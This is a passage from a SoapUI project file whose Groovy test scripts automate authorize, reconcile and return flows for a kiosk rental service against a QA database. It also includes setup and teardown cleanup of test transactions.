log.info ("KioskID:$kioskID; RentalTaxRate:$rentalTaxRate; PurchaseTaxRate:$purchaseTaxRate; DigitalPurchaseTaxRate:$digitalPurchaseTaxRate; ServiceFeeTaxRate:$serviceFeeTaxRate");
//Save Tax Rate at property level
testRunner.testCase.setPropertyValue('RentalTaxRate',rentalTaxRate.toString());
testRunner.testCase.setPropertyValue('PurchaseTaxRate',purchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('DigitalPurchaseTaxRate',digitalPurchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeTaxRate',serviceFeeTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeAmount',serviceFeeAmount.toString());

def getCP = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Get Customer Info From Encrypted CC"];
getCP.setPropertyValue("CardHashId",encryptCC.getPropertyValue("CardID"));
def getCPrunner = getCP.run( null, false );	
// show that it worked out ok
log.info("Status: $getCPrunner.status, time taken for TestCase was: $getCPrunner.timeTaken ms");
// assert that it didn't fail
assert getCPrunner.status != Status.FAILED : getCPrunner.reason
 
//Get CustomerProfileNumber
def CustomerProfileNumber = getCP.getPropertyValue("CpCustomerNumber");
log.info ("CustomerProfileNumber: $CustomerProfileNumber");
//if (CustomerProfileNumber == '&lt;CPCUSTOMERNUMBER/>')
//{
//	testRunner.testCase.setPropertyValue("CustomerProfileNumber","");
//}
//else
//{
	testRunner.testCase.setPropertyValue("CustomerProfileNumber",CustomerProfileNumber);
//}

def CustomerID = getCP.getPropertyValue("CustomerId");
//Deleting the records from CustomerDisc to avoid below error
//Found an existing CustomerDisc record for disc: XXXXX, matching customer: XXXXXX!  Echo message, rolling back reconcile
log.info("Number of customerdisc records deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in ($CustomerID)"));

//Create Credits.
if (CustomerProfileNumber != "" &amp;&amp; UseCredits == '2' &amp;&amp; IsOffline != "true")
{
	def generateCredits = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Set Up Credits"];
	generateCredits.setPropertyValue("CpCustomerNumber",CustomerProfileNumber);
	generateCredits.setPropertyValue("DVDCreditQty",context.expand( '${DataSource#DVDCredits}' ));
	generateCredits.setPropertyValue("MovieCreditQty",context.expand( '${DataSource#MovieCredits}' ));
	generateCredits.setPropertyValue("GameCreditQty",context.expand( '${DataSource#GameCredits}' ));

	def generateCreditsrunner = generateCredits.run( null, false );	
	// show that it worked out ok
	log.info("Status: $generateCreditsrunner.status, time taken for TestCase was: $generateCreditsrunner.timeTaken ms");
	// assert that it didn't fail
	assert generateCreditsrunner.status != Status.FAILED : generateCreditsrunner.reason

	log.info ("Successfully Created Credits");
}
else
{
	log.info ("No credits required for the testCase or CustomerProfileNumber is NULL");
}</script></con:config></con:testStep><con:testStep type="groovy" name="Authorize" id="493af3e9-b639-4df4-8b43-73b89e91430b"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
//Cleaning up the properties; set the values to NULL before the start

for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}

tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("CCNumber", context.expand( '${DataSource#Ccnumber}' ));
tc.setPropertyValue("CCType", context.expand( '${DataSource#CCType}' ));
tc.setPropertyValue("PromoCode", context.expand( '${DataSource#PromoCode}' ));
tc.setPropertyValue("PromoValue", context.expand( '${DataSource#PromoValue}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("rentalFormats", context.expand( '${DataSource#rentalFormats}' ));
tc.setPropertyValue("numOfRentals", context.expand( '${DataSource#numOfRentals}' ));
tc.setPropertyValue("PurchaseFormats", context.expand( '${DataSource#PurchaseFormats}' ));
tc.setPropertyValue("numOfPurchases", context.expand( '${DataSource#numOfPurchases}' ));
tc.setPropertyValue("SetDaysBack", context.expand( '${DataSource#SetDaysBack}' ));
tc.setPropertyValue("LoyaltyFlag", context.expand( '${DataSource#LoyaltyFlag}' ));
tc.setPropertyValue("UseCredits", '0');//HardCoded to 0 since it there will be no credits in future
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("CustomerProfileNumber", context.expand( '${#TestCase#CustomerProfileNumber}' ));
tc.setPropertyValue("EnableServiceFee", "false");
tc.setPropertyValue("ServiceFeeTaxRate", context.expand( '${#TestCase#ServiceFeeTaxRate}' ));
tc.setPropertyValue("ServiceFeeAmount", context.expand( '${#TestCase#ServiceFeeAmount}' ));
tc.setPropertyValue("HasUpsell", "false");


//Check how to get the disc price

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Authorize] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAILED")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="manualTestStep" name="Manual" id="b26dfd60-5b25-4f88-8469-71d6c49277a5" disabled="true"><con:settings/><con:config xsi:type="con:ManualTestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/></con:testStep><con:testStep type="groovy" name="Reconcile" id="1b2a1264-3d6a-4eab-878b-268542a1e594"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

def isOffline = context.expand( '${DataSource#IsOffline}' );
//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Reconcile"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("UseCredits", '0');
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("RentalVendStatus", context.expand( '${DataSource#RentalVendStatus}' ));
tc.setPropertyValue("PurchaseVendStatus", context.expand( '${DataSource#PurchaseVendStatus}' ));
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
tc.setPropertyValue("PurchaseCount", authtc.getPropertyValue("PurchaseCount"));
tc.setPropertyValue("PurchaseBarcodes", authtc.getPropertyValue("PurchaseBarcodes"));
tc.setPropertyValue("PurchaseTitleIds", authtc.getPropertyValue("PurchaseTitleIds"));
tc.setPropertyValue("PurchaseProductFamily", authtc.getPropertyValue("PurchaseProductFamily"));
tc.setPropertyValue("PurchaseProductType", authtc.getPropertyValue("PurchaseProductType"));
tc.setPropertyValue("PurchaseDiscPrice", authtc.getPropertyValue("PurchaseDiscPrice"));
tc.setPropertyValue("RentalCount", authtc.getPropertyValue("RentalCount"));
tc.setPropertyValue("RentalBarcodes", authtc.getPropertyValue("RentalBarcodes"));
tc.setPropertyValue("RentalTitleIds", authtc.getPropertyValue("RentalTitleIds"));
tc.setPropertyValue("RentalProductFamily", authtc.getPropertyValue("RentalProductFamily"));
tc.setPropertyValue("RentalProductType", authtc.getPropertyValue("RentalProductType"));
tc.setPropertyValue("RentalDiscPrice", authtc.getPropertyValue("RentalDiscPrice"));
tc.setPropertyValue("RentalNonReturnPrice", authtc.getPropertyValue("RentalNonReturnPrice"));
tc.setPropertyValue("RentalNonReturnDays", authtc.getPropertyValue("RentalNonReturnDays"));
tc.setPropertyValue("HasPhysicalPurchase", authtc.getPropertyValue("HasPhysicalPurchase"));
tc.setPropertyValue("DiscountPayload", authtc.getPropertyValue("DiscountPayload"));
tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
tc.setPropertyValue("PromoCode", authtc.getPropertyValue("PromoCode"));
tc.setPropertyValue("PromoValue", authtc.getPropertyValue("PromoValue"));
tc.setPropertyValue("DiscountAmountList", authtc.getPropertyValue("DiscountAmountList")); //PROMO
tc.setPropertyValue("CustomerProfileNumber", authtc.getPropertyValue("CustomerProfileNumber"));
tc.setPropertyValue("EstimatedLoyaltyAmount", authtc.getPropertyValue("EstimatedLoyaltyAmount"));
tc.setPropertyValue("HasLoyaltyDiscount", authtc.getPropertyValue("HasLoyaltyDiscount"));
tc.setPropertyValue("HasPromoDiscount", authtc.getPropertyValue("HasPromoDiscount"));
tc.setPropertyValue("EnableServiceFee", authtc.getPropertyValue("EnableServiceFee"));
tc.setPropertyValue("HasUpsell",authtc.getPropertyValue("HasUpsell"));
tc.setPropertyValue("ServiceFeePayload", authtc.getPropertyValue("ServiceFeePayload"));

if (isOffline == 'true')
{
	//For Offline set the values to NULL
	tc.setPropertyValue("TransactionID", "null");
	tc.setPropertyValue("InvoiceID", "");
}
else
{
	tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));
	tc.setPropertyValue("InvoiceID", authtc.getPropertyValue("InvoiceID"));
}

//tc.setPropertyValue("IsOffline", "false"); //hardCoded for time being.

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Reconcile] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAILED")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Reconcile $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Reconcile $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="manualTestStep" name="Manual 2" id="08aafb33-d067-499a-8947-49f699648a7e" disabled="true"><con:settings/><con:config xsi:type="con:ManualTestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/></con:testStep><con:testStep type="groovy" name="Return" id="7bb9ba6c-7faa-4ad9-84d6-b0dc5abb6bc0"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
//get the Return Test case
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Return"];
def reconciletc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Reconcile"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
def vendedBarcodes = reconciletc.getPropertyValue("VendedRentalBarcodes");
//def testreturnTYpe = '6,6,6';
//def testFailedSecurityRead = 'False,False,False'
def TransactionID = reconciletc.getPropertyValue("TransactionID");
def CardType = reconciletc.getPropertyValue("CardType");
def InvoiceID = reconciletc.getPropertyValue("InvoiceID");
def IsOffline = reconciletc.getPropertyValue("IsOffline");
def RentalCount = reconciletc.getPropertyValue("VendedRentalsCount");
def PurchaseCount = reconciletc.getPropertyValue("VendedPurchaseCount");
def setDaysBack = Eval.me("[" + context.expand('${DataSource#SetDaysBack}') + "]");
def customerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );
log.info ("setDaysBack:$setDaysBack; vendedBarcodes:$vendedBarcodes");
vendedBarcodesList = vendedBarcodes.split(",");
//testreturnTypeList = testreturnTYpe.split(",");
//testFailedSecurityReadList = testFailedSecurityRead.split(",");
//Added this logic to avoid bad data in datasource; test case failure due to bad data
if (vendedBarcodesList.size() != setDaysBack.size())
{
	def difference = (vendedBarcodesList.size() - setDaysBack.size())
     for (i = 0; i &lt; difference; i++)
     {
     	setDaysBack.add('0') //if the size is different add the default to 0
     }
}
else
{
     //nothing to do, code/data looks good
}
def setDaysBackList = setDaysBack.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
//Call Return Step in for loop based on number of barcodes.
if (vendedBarcodes == "")
{
	log.info ("No Return is required");
	testRunner.gotoStepByName("DataSource Loop");
}
else
{
	for (r = 0; r &lt; vendedBarcodesList.size(); r++)
	{				
		curvendedBarcodes = vendedBarcodesList[r].toString().trim();
		cursetDaysBack = setDaysBackList[r].toString().trim()
		log.info ("SetDaysBack:$cursetDaysBack ;Barcode:$curvendedBarcodes");

		//ReturnType = testreturnTypeList[r].toString().trim();
		//FailedSecurityRead = testFailedSecurityReadList[r].toString().trim();
	
		tc.setPropertyValue("Barcode", curvendedBarcodes);
		tc.setPropertyValue("SetDaysBack", cursetDaysBack);
		tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
		//tc.setPropertyValue("KioskID", '1529');
		//tc.setPropertyValue("KioskID", '1515'); //to check the return on different kiosk
		tc.setPropertyValue("TransactionID", TransactionID);
		tc.setPropertyValue("ReturnType", '6' );
		tc.setPropertyValue("FailedSecurityRead", 'False' );
		//tc.setPropertyValue("ReturnType", ReturnType.toString() );
		//tc.setPropertyValue("FailedSecurityRead", FailedSecurityRead.toString() );
		tc.setPropertyValue("CustomerProfileNumber", customerProfileNumber );
		tc.setPropertyValue("CardType", CardType);
		tc.setPropertyValue("InvoiceID", InvoiceID);
		tc.setPropertyValue("IsOffline", IsOffline);
		tc.setPropertyValue("RentalCount", RentalCount);
		tc.setPropertyValue("PurchaseCount", PurchaseCount);
	
		def runner = tc.run( null, false );
		// show that it worked out ok
		log.info("Status: $runner.status, time taken for TestCase [Return] was: $runner.timeTaken ms");
		def tcStatus = (runner.status).toString()
	//	assert runner.status != Status.FAILED : runner.reason
	
		if(tcStatus == "FAILED")
		{
			assert runner.status == Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
		}
		else
		{
			// assert that it didn't fail
			assert runner.status != Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("DataSource Loop");
		}
	
	}
}</script></con:config></con:testStep><con:testStep type="datasink" name="SaveResults" id="c09340af-77db-4c1e-9d0e-732cea827f61" disabled="true"><con:settings/><con:config xsi:type="con:DataSinkStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSink type="File"><con:configuration><fileName>${projectDir}/Test_Results.txt</fileName><separator>:</separator><escape>"</escape><quote>false</quote><trim>true</trim><append>false</append><encoding>Cp1252</encoding></con:configuration></con:dataSink><con:properties><con:property><con:name>Number</con:name><con:value>${#TestCase#ScenarioNo}</con:value></con:property><con:property><con:name>Scenario</con:name><con:value>${DataSource#Scenario}</con:value></con:property><con:property><con:name>TransactionId</con:name><con:value>${#TestCase#TransactionId}</con:value></con:property><con:property><con:name>Status</con:name><con:value>${#TestCase#TestCaseStatus}</con:value></con:property><con:property><con:name>Date</con:name><con:value>${=new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date())}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="datasourceloop" name="DataSource Loop" id="941b2a36-5472-447f-acdf-aa06127e284c" disabled="true"><con:settings/><con:config><dataSourceStep>DataSource</dataSourceStep><targetStep>Get Data</targetStep></con:config></con:testStep><con:setupScript>testRunner.testCase.setPropertyValue("StartTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));
log.info("/###########################START###########################/");
log.info("Test Case Name : " + context.testCase.name);
log.info("/###########################START###########################/");
//Cleanup Script
log.info("Cleaning up any open transactions from previous executions...");
import com.eviware.soapui.model.testsuite.TestRunner.Status
import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName("RedboxServerDB");
def rbconstring = rbConObj.getConnectionString();
log.info ("#########################################################################################")
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(rbconstring);
def mssql = Sql.newInstance(msconstring);

//Disable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 0");
log.info ("Batch Job is disabled");

log.info("...cleaning up transactions");
sql.eachRow("SELECT t.transaction_id FROM [Transaction] t INNER JOIN disc_transaction dt ON t.transaction_id = dt.transaction_id WHERE t.customer_id in (19799) AND dt.Transaction_Type = 1  AND t.Transaction_Status = 4 AND ((dt.DiscTransaction_Status = 2) OR ( dt.DiscTransaction_Status = 4 AND t.ChargeDate IS NOT NULL AND (ApprovalCode IS NULL OR ApprovalCode = '')))"){
//for each transaction id remove disc transaction, transaction and customer disc etc
	row ->
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM TransactionDiscount WHERE TransactionId = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM disc_transaction WHERE transaction_id = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM unplayablereturnhistory WHERE transactionid = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM [TRANSACTION] WHERE TRANSACTION_ID = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM CustomerTransaction WHERE TransactionID = ${row.Transaction_Id}"))
}


log.info("...cleaning up barcodes");
//reset the disc statuses to 'in kiosk'
log.info("Number of customer disc deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in (19799)"))
//sql.executeUpdate("UPDATE disc SET physical_status = 2 Where Title_ID in (Select Title_ID from Title WHere [FormatId] = 17) and KioskClient_ID = 1505")
sql.executeUpdate("UPDATE disc SET physical_status = 2 Where KioskClient_ID = 1505")</con:setupScript><con:tearDownScript>import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def mssql = Sql.newInstance(msconstring);
//Enable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 1");
log.info ("Batch Job is Enabled");

log.info("/###########################END###########################/");
log.info("Test Case Name : " + context.testCase.name + "Test Case Status : " + testRunner.getStatus());
log.info ("Time Taken: ${((testRunner.timeTaken)/1000)/60} mins");
log.info("/###########################END###########################/");
testRunner.testCase.setPropertyValue("EndTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));</con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value>1770132</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2148837091</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">90284864596698</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.7500</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>ServiceFeeTaxRate</con:name><con:value>9.9500</con:value></con:property><con:property><con:name>TestCaseStatus</con:name><con:value>Return PASS</con:value></con:property><con:property><con:name>ScenarioNo</con:name><con:value/></con:property><con:property><con:name>StartTime</con:name><con:value>06/20/18-10:03:41.119</con:value></con:property><con:property><con:name>EndTime</con:name><con:value>06/20/18-10:03:45.485</con:value></con:property><con:property><con:name>ServiceFeeAmount</con:name><con:value>0.0900</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>6873cb8c-7751-4904-9fc0-ed152c6ef0c6</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>d498c61d-c9fd-48e5-baf1-1503a4a1b824</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>275f8372-53c8-49f3-807b-3f64816f3d89</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>3b329060-a4aa-4532-9611-e37bcd9a11c3</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>f9658b22-7814-4f47-af67-f42efbd6c101</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>ef30018b-951d-43d4-95b1-5f1c3248c5b1</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>b3b7c784-7c50-42e4-b75d-8e6f746e026c</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>347bcb1b-704d-4b55-82ea-8c570a159ab9</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="72de1cfc-54a4-43ac-be03-a407294d843f" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="ForCollector" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" disabled="true" maxResults="0"><con:settings><con:setting id="IncludeOverview">true</con:setting><con:setting id="IncludeResults">true</con:setting><con:setting id="FlowLayout">false</con:setting><con:setting id="ErrorDetails">true</con:setting><con:setting id="IncludeCoverage">true</con:setting></con:settings><con:testStep type="jdbc" name="WarmUp Script" id="93c7785c-dd58-4bcd-a66c-426b3d6046aa"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() AS CurrentDateTime</con:query><con:properties/></con:config></con:testStep><con:testStep type="groovy" name="Counter" id="a8e85a27-d4a5-460d-b942-8de1caf57ab6"><con:settings/><con:config><script>testRunner.testCase.setPropertyValue("RowCount", (testRunner.testCase.getPropertyValue("RowCount").toShort() + 1 ).toString())

def rowCount = Integer.valueOf(context.expand( '${#TestCase#RowCount}' ))
if (rowCount > 2000)
{
	log.info ("Done");
	testRunner.gotoStepByName('Done');
}
else
{
	//log.info ("Still working out");
}
</script></con:config></con:testStep><con:testStep type="datasource" name="DataSource" id="a3fc39af-d0d3-40cd-9840-7ed827eb5b31"><con:settings/><con:config xsi:type="con:DataSourceStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSource type="Excel"><con:configuration><file>${projectDir}/KS-DataSource.xls</file><worksheet>Online</worksheet><cell>A2</cell><ignoreEmpty>false</ignoreEmpty><evaluateFormulas>false</evaluateFormulas></con:configuration></con:dataSource><con:property>Scenario</con:property><con:property>Email</con:property><con:property>Ccnumber</con:property><con:property>CCType</con:property><con:property>PromoCode</con:property><con:property>PromoValue</con:property><con:property>KioskID</con:property><con:property>rentalFormats</con:property><con:property>numOfRentals</con:property><con:property>RentalVendStatus</con:property><con:property>PurchaseFormats</con:property><con:property>numOfPurchases</con:property><con:property>PurchaseVendStatus</con:property><con:property>SetDaysBack</con:property><con:property>IsOffline</con:property><con:property>LoyaltyFlag</con:property><con:completeLastOperation>true</con:completeLastOperation><con:restartOnRun>true</con:restartOnRun></con:config></con:testStep><con:testStep type="groovy" name="Get Data" id="fb8fddd1-3bd8-4d6e-b780-e9d899c955b4"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def ScenarioNo =  context.expand( '${DataSource#ID}' );
testRunner.testCase.setPropertyValue("ScenarioNo", ScenarioNo.toString())
log.info ("------------------------------START----------------------------------");
log.info ("Scenario No: $ScenarioNo");
log.info ("Scenario:Kiosk " + context.expand( '${DataSource#Scenario}' ));
log.info ("------------------------------START----------------------------------");

//Get Data from Data Source
def ccNumber = context.expand( '${DataSource#Ccnumber}' );
def kioskID = context.expand( '${DataSource#KioskID}' );
def UseCredits = '0'; //Default to ); since credits will be disabled after Loyality is ON
def IsOffline = context.expand( '${DataSource#IsOffline}' );

//Get Encrypted CC Info using Merchant Service method.
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
encryptCC.setPropertyValue("CardNumber", ccNumber);
encryptCC.setPropertyValue("KeyID", context.expand( '${#Project#KeyId}' ));

def ccrunner = encryptCC.run( null, false );	
// show that it worked out ok
log.info("Status: $ccrunner.status, time taken for TestCase was: $ccrunner.timeTaken ms");
// assert that it didn't fail
assert ccrunner.status != Status.FAILED : ccrunner.reason

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get TaxRate for the Kiosk.
def taxDetails = sql.firstRow("Select Sales_Tax_Rate, PurchaseTaxRate, DigitalPurchaseTaxRate, ServiceFeeTaxRate,ServiceFee  from KioskClient Where KioskClient_Id = $kioskID");
def rentalTaxRate = (taxDetails.Sales_Tax_Rate);
def purchaseTaxRate = (taxDetails.PurchaseTaxRate);
def digitalPurchaseTaxRate = (taxDetails.DigitalPurchaseTaxRate);
def serviceFeeTaxRate = (taxDetails.ServiceFeeTaxRate)!= null ? (taxDetails.ServiceFeeTaxRate) : "0.0000";
def serviceFeeAmount = (taxDetails.ServiceFee)!= null ? (taxDetails.ServiceFee) : "0.0000";

log.info ("KioskID:$kioskID; RentalTaxRate:$rentalTaxRate; PurchaseTaxRate:$purchaseTaxRate; DigitalPurchaseTaxRate:$digitalPurchaseTaxRate; ServiceFeeTaxRate:$serviceFeeTaxRate");
//Save Tax Rate at property level
testRunner.testCase.setPropertyValue('RentalTaxRate',rentalTaxRate.toString());
testRunner.testCase.setPropertyValue('PurchaseTaxRate',purchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('DigitalPurchaseTaxRate',digitalPurchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeTaxRate',serviceFeeTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeAmount',serviceFeeAmount.toString());

def getCP = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Get Customer Info From Encrypted CC"];
getCP.setPropertyValue("CardHashId",encryptCC.getPropertyValue("CardID"));
def getCPrunner = getCP.run( null, false );	
// show that it worked out ok
log.info("Status: $getCPrunner.status, time taken for TestCase was: $getCPrunner.timeTaken ms");
// assert that it didn't fail
assert getCPrunner.status != Status.FAILED : getCPrunner.reason

//Get CustomerProfileNumber
def CustomerProfileNumber = getCP.getPropertyValue("CpCustomerNumber");
testRunner.testCase.setPropertyValue("CustomerProfileNumber",CustomerProfileNumber);
def CustomerID = getCP.getPropertyValue("CustomerId");
//Deleting the records from CustomerDisc to avoid below error
//Found an existing CustomerDisc record for disc: XXXXX, matching customer: XXXXXX!  Echo message, rolling back reconcile
log.info("Number of customerdisc records deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in ($CustomerID)"));

//Create Credits.
if (CustomerProfileNumber != "" &amp;&amp; UseCredits == '2' &amp;&amp; IsOffline != "true")
{
	def generateCredits = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Set Up Credits"];
	generateCredits.setPropertyValue("CpCustomerNumber",CustomerProfileNumber);
	generateCredits.setPropertyValue("DVDCreditQty",context.expand( '${DataSource#DVDCredits}' ));
	generateCredits.setPropertyValue("MovieCreditQty",context.expand( '${DataSource#MovieCredits}' ));
	generateCredits.setPropertyValue("GameCreditQty",context.expand( '${DataSource#GameCredits}' ));

	def generateCreditsrunner = generateCredits.run( null, false );	
	// show that it worked out ok
